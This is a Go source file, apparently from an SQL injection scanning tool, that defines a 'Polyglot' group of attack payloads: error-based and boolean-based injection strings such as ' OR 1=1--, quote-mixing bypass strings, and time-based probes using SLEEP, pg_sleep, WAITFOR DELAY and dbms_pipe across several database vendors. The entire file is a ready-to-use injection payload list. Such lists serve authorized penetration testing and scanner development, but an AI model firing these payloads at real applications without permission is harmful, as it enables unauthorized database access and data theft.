package payloads

var Polyglot = PayloadGroup{
	DBMS: "Polyglot",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// MULTI-DBMS POLYGLOT PAYLOADS
		// ═══════════════════════════════════════════
		{Type: "error", Content: "SLEEP(5) /*' or SLEEP(5) or '\" or SLEEP(5) or \"*/"},
		{Type: "error", Content: "1' OR SLEEP(5) OR '1'='1"},
		{Type: "error", Content: "1\" OR SLEEP(5) OR \"1\"=\"1"},
		{Type: "error", Content: "' OR 1=1 OR '\" OR 1=1 OR \"' OR 1=1 OR '"},
		{Type: "error", Content: "' OR '1'='1' /*"},
		{Type: "error", Content: "' OR '1'='1' #"},
		{Type: "error", Content: "' OR 1=1 --"},
		{Type: "error", Content: "' OR 1=1 #"},
		{Type: "error", Content: "' OR 1=1/*"},
		{Type: "error", Content: "' OR 1=1; --"},

		// ═══════════════════════════════════════════
		// UNIVERSAL CHARSET INJECTION
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' OR 1=1--"},
		{Type: "boolean", Content: "\" OR 1=1--"},
		{Type: "boolean", Content: "1' OR '1'='1' --"},
		{Type: "boolean", Content: "1\" OR \"1\"=\"1\" --"},
		{Type: "boolean", Content: "` OR 1=1 --"},
		{Type: "boolean", Content: "') OR 1=1--"},
		{Type: "boolean", Content: "') OR ('1'='1"},
		{Type: "boolean", Content: "1')) OR 1=1--"},
		{Type: "boolean", Content: "1')) OR ('1'='1"},
		{Type: "boolean", Content: "')) OR 1=1--"},
		{Type: "boolean", Content: "'))) OR 1=1--"},

		// ═══════════════════════════════════════════
		// MULTI-QUOTE BYPASS
		// ═══════════════════════════════════════════
		{Type: "error", Content: "'\"`--"},
		{Type: "error", Content: "\"'`--"},
		{Type: "error", Content: "`'\"--"},
		{Type: "error", Content: "'\"` OR 1=1--"},
		{Type: "error", Content: "1' OR 1=1 AND '\"`'='"},
		{Type: "error", Content: "' OR '1'='1' -- \" OR 1=1 --"},
		{Type: "error", Content: "1' = '1' -- ' OR 1=1 --"},
		{Type: "error", Content: "' or 1=1 or '\"' or 1=1 or \"'"},
		{Type: "error", Content: "1' OR 1=1 OR 1' OR 1=1 OR '1"},
		{Type: "error", Content: "1' OR 1=1 AND 1=\"1"},
		{Type: "error", Content: "' OR '1'='1"}, 

		// ═══════════════════════════════════════════
		// UNIVERSAL COMMENT BYPASS
		// ═══════════════════════════════════════════
		{Type: "error", Content: "') OR ((('1'='1"},
		{Type: "error", Content: "')) OR ((('1'='1"},
		{Type: "error", Content: "'))) OR (((('1'='1"},

		// ═══════════════════════════════════════════
		// MULTI-VENDOR TIME-BASED POLYGLOT
		// ═══════════════════════════════════════════
		{Type: "time", Content: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1"},
		{Type: "time", Content: "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1"},
		{Type: "time", Content: "' OR SLEEP(5) OR '1'='1"},
		{Type: "time", Content: "1' OR SLEEP(5) OR '1'='1"},
		{Type: "time", Content: "\" OR SLEEP(5) OR \"1\"=\"1"},
		{Type: "time", Content: "' AND (SELECT 1 FROM pg_sleep(5)) AND '1'='1"},
		{Type: "time", Content: "'; WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "\"; WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "1'; WAITFOR DELAY '0:0:5'--"},
		{Type: "time", Content: "' AND 1=dbms_pipe.receive_message('RDS',5)--"},
	},
}
